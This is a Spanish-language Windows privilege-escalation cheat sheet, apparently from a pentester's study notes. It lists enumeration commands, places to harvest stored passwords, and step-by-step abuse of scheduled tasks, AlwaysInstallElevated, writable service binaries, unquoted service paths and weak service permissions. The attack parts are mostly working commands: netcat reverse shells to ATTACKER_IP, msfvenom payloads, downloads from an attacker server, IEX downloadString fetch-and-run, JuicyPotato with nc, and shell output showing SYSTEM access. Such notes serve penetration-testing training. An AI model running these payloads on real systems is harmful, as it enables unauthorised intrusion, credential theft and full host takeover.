## Usuarios Windows

Unas tablas con los diferentes usuarios windows que nos podemos enfrentar en la esacala con sus privilegios explicados.

|   |   |
|---|---|
|Administrators|Estos usuarios son los que tienen más privilegios. Pueden cambiar cualquier parámetro de configuración del sistema y acceder a cualquier archivo del sistema.|
|Standard Users|Estos usuarios pueden acceder al ordenador pero sólo realizar tareas limitadas. Normalmente, estos usuarios no pueden realizar cambios permanentes o esenciales en el sistema y están limitados a sus archivos.|

|   |   |
|---|---|
|SYSTEM / LocalSystem|Cuenta utilizada por el sistema operativo para realizar tareas internas. Tiene acceso completo a todos los archivos y recursos disponibles en el host, con privilegios incluso superiores a los de los administradores.|
|Local Service|Cuenta por defecto utilizada para ejecutar los servicios de Windows con privilegios "mínimos". Utilizará conexiones anónimas a través de la red.|
|Network Service|Cuenta por defecto utilizada para ejecutar los servicios de Windows con privilegios "mínimos". Utilizará las credenciales del ordenador para autenticarse a través de la red.|

## Comandos esenciales

### Información del sistema


``` powershell
systeminfo # información del sistema
systeminfo | find ": KB" # obtener actualizaciones instaladas
set # variables del sistema
wmic logicaldisk get deviceid, volumename, description # listar los dirvers locales y network
systeminfo | findstr /B /C:"Domain" # domain controller
ipconfig /all
route print # ver las tablas de routing
netstat -ano # conexiones activas 
# para ver el estado del firewall y la configuración
netsh firewall show state
netsh firewall show config
net share # listar los network drives
ipconfig /displaydns # dns cache
dir /a # para listar archivos/directorios ocultos
sc query # ver los servicios existentes del sistema
whoami /priv # para saber que privilegios tiene tu usuario actual
find /s file # para buscar en el sistema con X nombre (user.txt | passwords.xml | *.txt)
```

### Usuarios y grupos


``` powershell
whoami | net user %username% # que usuarios soy
# listar todos los usuarios
net user
whoami /all
net user <user> # Detalles de usuario especifico
net accounts # politicas de password 
net localgroup # ver los grupos locales
```

### Servicios

``` powershell
wmic service get Caption,StartName,State,pathname # servicios en ejectución
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """ #listar unquoted service binaries
sc stop <nombre del servicio> # parar servicio
sc start <nombre del servicio> # iniciar servicio
```

### World Writable Folders

``` powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
```

### Buscar archivos del sistema

``` powershell
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si pass *.txt
findstr /si pass *.xml
findstr /si pass *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
```

### Ver papelera de reciclaje

``` powershell
cd 'c:\$recycle.bin\<User SID>'
dir /A
```

Referencias de estas notas de la siguiente web:
[Privilege Escalation ChecklistPentest Everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/privilege-escalation-checklist)

## Recolección de contraseñas en lugares típicos

### Instalaciones desatendidas

``` powershell
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Ejemplo de como puede encontrarse

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FpwJmgSMtkKCxfXwvTFK6%252Fimagen.png%3Falt%3Dmedia%26token%3D57404063-c592-4a5e-b4e6-6af90d66c82f&width=768&dpr=4&quality=100&sign=d7792e4a8051eda2ed8db998aadc86ad5eaf25d6e748a2cd6622b033af3365ad)

### Historial Powershell

Entrar en una terminal cmd.exe y ejecuta el siguiente comando

``` powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cd C:\Users\$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
type ConsoleHost_history.txt
```

### Credenciales guardadas de Windows

Windows nos permite utilizar las credenciales de otros usuarios. Esta función también da la opción de guardar estas credenciales en el sistema. El siguiente comando enumerará las credenciales guardadas:

``` powershell
cmdkey /list
```

Si bien no puede ver las contraseñas reales, si observa alguna credencial que valga la pena probar, puede usarla con el `runas`comando y el `/savecred`opción, como se ve a continuación.

``` powershell
runas /savecred /user:admin cmd.exe
```

### Configuración IIS

Internet Information Services (IIS) es el servidor web predeterminado en las instalaciones de Windows. La configuración de sitios web en IIS se almacena en un archivo llamado `web.config`y puede almacenar contraseñas para bases de datos o mecanismos de autenticación configurados. Dependiendo de la versión instalada de IIS, podemos encontrar web.config en una de las siguientes ubicaciones:

- C:\inetpub\wwwroot\web.config

- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config


También hay otra manera más rápida de encontrar las passwords en la base de datos del archivo:

``` powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### .NET versiones instaladas


``` powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP
```

### Recuperar credenciales mediante Putty

PuTTY es un cliente SSH que se encuentra comúnmente en los sistemas Windows. En lugar de tener que especificar los parámetros de una conexión cada vez, los usuarios pueden almacenar sesiones donde la IP, el usuario y otras configuraciones se pueden almacenar para su uso posterior. Si bien PuTTY no permitirá que los usuarios almacenen su contraseña SSH, almacenará configuraciones de proxy que incluyen credenciales de autenticación de texto simple.

``` powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Nota: Simon Tatham es el creador de PuTTY (y su nombre es parte de la ruta), no el nombre de usuario para el que estamos recuperando la contraseña. El nombre de usuario del proxy almacenado también debería estar visible después de ejecutar el comando anterior.

Así como Putty almacena credenciales, cualquier software que almacene contraseñas, incluidos navegadores, clientes de correo electrónico, clientes FTP , clientes SSH, software VNC y otros, tendrá métodos para recuperar las contraseñas que el usuario haya guardado

### Programas en ejecución

Puedes a veces encontrar password de servicios en ejecución en el registro.

Como por ejemplo servidores [VNC](https://www.google.com/search?client=firefox-b-d&q=QUE+ES+VNC), o versiones de FileZilla FTP que suele dejar las credenciales en un archivoXML en `C:\Program Files\FileZilla Server\FileZIlla Server.xml` o `C:\xampp\FileZilla Server\FileZilla Server.xml`

### Añadir usuario como admin

`net user <usuario> <pass> /add`

`net localgroup administrators <usuario> /add`

## Tareas programadas

Al examinar las tareas programadas en el sistema de destino, es posible que vea una tarea programada que perdió su binario o que está usando un binario que puede modificar.

Las tareas programadas se pueden enumerar desde la línea de comando usando el `schtasks`Comando sin ninguna opción. Para recuperar información detallada sobre cualquiera de los servicios, puede utilizar un comando como el siguiente:

``` powershell
schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             j4ckie-PC1
TaskName:                             \tareavulnerable
Task To Run:                          C:\task\schtask.bat
Run As User:                          user1
```

**Ejemplo**

``` powershell
icacls c:\task\schtask.bat # para ver los permisos del archivo
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(F)
```

#### Tipo de permisos

``` powershell
N - sin acceso
F - acceso total
M - acceso de modificación
RX - acceso de lectura y ejecución
R - acceso de solo lectura
W - acceso de solo escritura
D - acceso de eliminación
```

En este caso encontramos que la carpeta C:\task\schtask.bat\ tenemos acceso (F) y podemos crear lo que queramos dentro y ejecutarlo como root. Entonces vamos a meter este archivo en la tarea programada y así cuando se ejcute nos de una shell.

``` powershell
echo c:\tmp\nc64.exe -e cmd.exe ATTACKER_IP 4443 > C:\task\schtask.bat
```

``` powershell
nc -lvnp 4443 # listener
```

#### Ejecutamos la tarea

``` powershell
schtasks /run /tn tareavulnerable
```

Nos tendría que dar una shell.

## AlwaysInstallElevated

Windows installer files (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Por lo general, se ejecutan con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos pueden configurarse para ejecutarse con mayores privilegios desde cualquier cuenta de usuario (incluso las que no tienen privilegios). Esto podría permitirnos generar un archivo MSI malicioso que se ejecutaría con privilegios de administrador.

Este método requiere que se establezcan dos valores de registro:

``` powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Creamos un payload .msi con msfvenom:

``` powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicioso.msi
```

Como se trata de un shell inverso, también debe ejecutar el módulo Metasploit Handler configurado en consecuencia. Una vez que haya transferido el archivo que ha creado, puede ejecutar el instalador con el siguiente comando y recibir el shell inverso:


``` powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicioso.msi
```

## Abusando servicios mal configurados

### Windows Services

Para ver los servicios existentes del sistema

``` powershell
sc query
```

- Los servicios de Windows son administrados por el Administrador de control de servicios (SCM), que se encarga de su estado y configuración.

- Cada servicio tiene un ejecutable asociado que es ejecutado por el SCM cuando el servicio se inicia.

- Los ejecutables de servicio deben implementar funciones especiales para comunicarse con el SCM.

- Los servicios especifican la cuenta de usuario bajo la cual se ejecutan.

- Usa el comando `sc qc` en el Símbolo del sistema para verificar la configuración de un servicio.

``` powershell
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: apphostsvc
TYPE               : 20  WIN32_SHARE_PROCESS        
START_TYPE         : 2   AUTO_START    
ERROR_CONTROL      : 1   NORMAL        
BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost        
LOAD_ORDER_GROUP   :        
TAG                : 0        
DISPLAY_NAME       : Application Host Helper Service        
DEPENDENCIES       :    
SERVICE_START_NAME : localSystem
```

- El parámetro `BINARY_PATH_NAME` especifica el ejecutable asociado con el servicio.

- El parámetro `SERVICE_START_NAME` indica la cuenta de usuario utilizada para ejecutar el servicio.

- Los servicios tienen una Lista de Control de Acceso Discrecional (DACL) que determina los permisos para varias operaciones,la DACL se puede ver utilizando herramientas como Process Hacker.


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FqbT6d4wKQrUyqUJSN70V%252Fimagen.png%3Falt%3Dmedia%26token%3D064a655b-78d1-4356-b012-446bcd79c1be&width=768&dpr=4&quality=100&sign=98f5b3df9c73ef69cad94f90918cf32f7ceba3b50276b6b0415f1ea72f00d83e)

Ejemplo de propiedades de un servicio

- Las configuraciones de los servicios se almacenan en el registro en `HKLM\SYSTEM\CurrentControlSet\Services`


![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FUhFc7MxV4QGZMgVQSfWE%252Fimagen.png%3Falt%3Dmedia%26token%3D97f7accf-edd7-44e8-8e05-661f9edeb927&width=768&dpr=4&quality=100&sign=fc2626f141a0ba5b061a20fe8373ac501926b21ab6488532e0b6ddb4ff9048d5)

El registro de el AppHostSvc

- Cada servicio tiene una subclave con el ejecutable asociado y la cuenta de inicio.

- Si se configura un DACL, se almacenará en una subclave llamada Security.

- Modificar las entradas del registro de los servicios generalmente requiere privilegios de administrador.

### Permisos inseguros en el ejecutable de los servicios

Si un ejecutable asociado a un servicio con unos permisos inseguros que permite que lo modificamos o lo remplacemos, podemos abusar de ello.

Primero tenemos que ver un ejemplo para ver como sería, encontramos una vulnerabilidad en el Splinterware System Scheduler.

1. Primero vamos revisar la configuración del servicio con `sc qc`


```
sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

1. Como vemos el servicio vulnerable se ejecuta como el usuario svcuser1 que está asociado con el servicio `C:\PROGRA~2\SYSTEM~1\WService.exe` vamos a proceder a revisar los permisos del ejecutable:


```
C:\Users\j4ckie>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Y tenemos algo interesante, el grupo Everyone tiene una (M) que significa que cualquiera puede modificar el ejecutable del servicio. Eso quiere decir que podemos escribir en el y poner por ejemplo que nos envie una reverse shell, o incluso crear un payload con msfvenom que sustituya el servicio original con el payload nuestro.

``` powershell
j4ckie@jackie-host$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

j4ckie@jackie-host$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Lo descargamos desde la maquina victima desde una powershell

``` powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Y entonces movemos el servicio original a otro directorio y lo sustitumos por el payload que hemos creado nosotros con msfvenom

Copy

``` powershell
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Una vez hecho el anterior proceso, abrimos un listener desde nuestra máquina atacante


``` bash
nc -lvnp 4445
```

Y entones paramos el servicio de windowsscheduler

``` powershell
sc stop windowsscheduler
sc start windowsscheduler
```

Y una vez se reinicie nos dará una shell como el usuario propietario del servicio y habremos escalado de permisos.

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FVIrD4h9VdLKnUxrUztA3%252Fimagen.png%3Falt%3Dmedia%26token%3D0ca5cf53-d424-4f9a-a2b6-9f3862158da0&width=768&dpr=4&quality=100&sign=cb51dc68638b1099ea4d1b14957419736e56787f09393068b07c57e704c78576)

Paramos el servicio y lo volvemos a iniciar

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252F1xrn4TglElnj6ERVvN9R%252Fimagen.png%3Falt%3Dmedia%26token%3Dc844847f-9969-4623-922e-06e184f36c4d&width=768&dpr=4&quality=100&sign=0483cc73755a19e3a2f2985a0d44be34f9422be405f1c27058ad8dfcd1be541e)

Nos da una shell con el usuario svcusr1

### Unquoted Service Paths

Cuando no podemos escribir en los ejecutables directamente como en el anterior, hay otra posibilidad de forzar al que el servicio ejecute ejecutables arbitrarios mediante el uso de una característica.

Cuando trabajamos con los servicios de Windows, hay un comportamiento muy particular que ocurre cuando el servicio es configurado a tal punto que esta "unquoted". Cuando digo unquoted quiero decir que la ruta del ejecutable no está entre comillas correctamente para tener en cuenta los espacios en el comando.

Como ejemplo, veamos la diferencia entre dos servicios. El primer servicio utilizará unas comillas adecuadas para que el SCM sepa sin duda que tiene que ejecutar el archivo binario señalado por `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, seguido de los parámetros dados:

```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Y ahora veamos el otro servicio sin sus comillas


```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Aquí viene el problema, cuando el SCM intenta ejecutar el binario asociado ya que hay espacios en la carpeta de "disk sorter enterprise" el comando se vuelve ambiguo, y el SCM no entiende cual de los siguientes comandos que queremos ejecutar:

|Comando|Argumento 1|Argumento2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

Esto tiene que ver con la forma en que el cmd analiza un comando. Por lo general, cuando envía un comando, los espacios se usan como separadores de argumentos a menos que formen parte de una cadena entrecomillada. Esto significa que la interpretación "correcta" del comando sin comillas sería ejecutar `C:\\Myprogram\\Disk.exe` y tomar el resto como argumentos.

1. Primero, busca `C:\\MyPrograms\\Disk.exe`. Si existe, el servicio ejecutará este ejecutable.

2. Si este último no existe, entonces buscará `C:\\MyPrograms\\Disk Sorter.exe`. Si existe, el servicio ejecutará este ejecutable.

3. Si este último no existe, entonces buscará `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. Se espera que esta opción tenga éxito y, por lo general, se ejecutará en una instalación predeterminada.


A partir de este comportamiento, el problema se hace evidente. Si un atacante crea alguno de los ejecutables que se buscan antes que el ejecutable del servicio esperado, puede obligar al servicio a ejecutar un ejecutable arbitrario.

Si bien esto suena trivial, la mayoría de los ejecutables del servicio se instalarán bajo `C:\Program Files`o `C:\Program Files (x86)`por defecto, que no es escribible por usuarios sin privilegios. Esto evita que cualquier servicio vulnerable sea explotado. Hay excepciones a esta regla: - Algunos instaladores cambian los permisos en las carpetas instaladas, lo que hace que los servicios sean vulnerables. - Un administrador puede decidir instalar los archivos binarios del servicio en una ruta no predeterminada. Si tal ruta es de escritura mundial, la vulnerabilidad puede ser explotada.

En nuestro caso, el administrador instaló los archivos binarios de Disk Sorter en `c:\MyPrograms`. Por defecto, hereda los permisos del `C:\`directorio, que permite a cualquier usuario crear archivos y carpetas en él. Podemos verificar esto usando `icacls`:


```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

El `BUILTIN\\Users`El grupo tiene **privilegios AD** y **WD** , lo que permite al usuario crear subdirectorios y archivos, respectivamente.

Creamos un msfvenom y transferimos a la maquina victima:

```
j4ckie@jackie-host$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc.exe

j4ckie@jackie-host$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora lo movemos a `C:\MyPrograms\Disk.exe`y le ponemos permisos de ejecución como Everyone.

```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```


```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

Una vez que el servicio se reinicia, se debería ejecutar el payload que nosotros hemos creado y darnos una shell:


```
nc -lvnp 4446
```

![](https://j4ckie0x17.gitbook.io/~gitbook/image?url=https%3A%2F%2F1367155054-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqCnBDYTntMpZLlwqTWcg%252Fuploads%252FViM29l6BA3JLizZjDBsZ%252Fimagen.png%3Falt%3Dmedia%26token%3D9e82a164-4232-4417-a8d8-659db76aa9e5&width=768&dpr=4&quality=100&sign=7a177811746861a0a74261d999209797731fd9030c43bb45f17a96fc431c0ad0)

Shell como svcusr2

[[Windows) | VK9 SecurityVK9 Security](https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/|Privilege Escalation - Unquoted Service Path (Windows) | VK9 SecurityVK9 Security]]

### Insecure Service Permissions

Si fuera el caso de que el DACL esta bien configurado y/o el servicio tiene una ruta correcta, aun tenemos oportunidad de explotar de los servicios. Si el DACL no te deja modificarlo aun puedes intentar reconfigurarlo. Esto le permitirá apuntar a cualquier ejecutable que necesite y ejecutarlo con cualquier cuenta que prefiera, incluido el propio SISTEMA.

Para verificar que esto es posible se puede utilizar un programa llamado [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) que esta en la suit de sysinternals.

**Ejemplo de ejecutar el Accesschk**


```
C:\tools\AccessChk> accesschk64.exe -qlc j4ckieservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Podemos ver como en `BUILTIN\Users` tiene el permiso `SERVICE_ALL_ACCESS` que eso significa que los cualquier usuario puede reconfigurar el servicio.

Antes de cambiarlo vamos a utilizar msfvenom para volver a cambiar el servicio original para que nos de una shell como el usuario propietario del servicio:


```
j4ckie@jackie-host$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

j4ckie@jackie-host$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Una vez hecho, hacemos lo de antes lo pasamos a la maquina victima a través de un servidor python y una vez en la maquina victima le damos permisos **Everyone** para poder ejecutar el payload.


```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Nos ponemos en escucha por el puerto 4447


```
nc -lvnp 4447
```

Ahora reconfiguramos el servicio existente el cual lo ejecutaremos con LocalSystem por qué es el usuario con mayores privilegios disponibles en la máquina, pero podriamos utilizar cualquier usuario que este en **Everyone.**

```
sc config J4ckieService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Reiniciamos el servicio


```
C:\> sc stop J4ckieService
C:\> sc start J4ckieService
```


```
j4ckie@j4ckiehost$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

[Windows Privilege Escalation / Insecure Service PermissionsMedium](https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219)

## Abusando de privilegios peligrosos

**Lista de privilegios peligrosos en este proyecto de github**
[[mis)use the Windows Privileges to elevate your rights within the OS.GitHub](https://github.com/gtworek/Priv2Admin|GitHub - gtworek/Priv2Admin: Exploitation paths allowing you to (mis)use the Windows Privileges to elevate your rights within the OS.GitHub]]

## Abusando de programas vulnerables

### Unpatched Software

```
wmic product get name,version,vendor # para listar los programas instalados
```

## Herramientas automatizadas

- WinPEAS: [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

- PrivEscCheck: [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

- WES-NG: [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

- Watson para ver si hay versiones antiguas de los programas: [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)

- Sherlock.ps1 para ver si hay exploit kernel: [https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1) (Para ejecutarlo simplemente tenemos que añadir al final del script `Find-AllVulns` y poner el script en un servidor con python y ejecutarlo desde la máquina con el siguiente comando `IEX(New-Object Net.WebClient).downloadString('http://<tuip>/Sherlock.ps1'`)

- JuicyPotato: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato) para abusar de estos privilegios:

    - SeImpresonatePrivilage

    - SeAssignPrimaryTokenPrivilage

```
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\PrivESc\nc.exe -e cmd 10.10.14.14 4443" -c "CLSID"
```

En versiones antiguas como Windows Server 2003 no funciona el JuicyPotato, pero hay el churrasco.exe que funciona en estos casos, paso un artículo que lo explica todo:[https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

Aquí dejo un artículo que explica muy bien como funciona el JuicyPotato:
[Impersonating Privileges with Juicy PotatoMedium](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)

- RottenPotatoNG: [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) para abusar de estos privilegios:

    - CoGetInstanceFromIStorage

    - ImpersonationToken



Aquí dejo un artículo que es explica muy bien cómo funciona el rottenpotato
[Rotten Potato – Privilege Escalation from Service Accounts to SYSTEMfoxglovesec](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

También hay un módulo en metasploit que hacre algo parecido `multi/recon/local_exploit_suggester`

## Contenido adicional

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)

- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)

- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

- [Decoder's Blog](https://decoder.cloud/)

- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)

- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)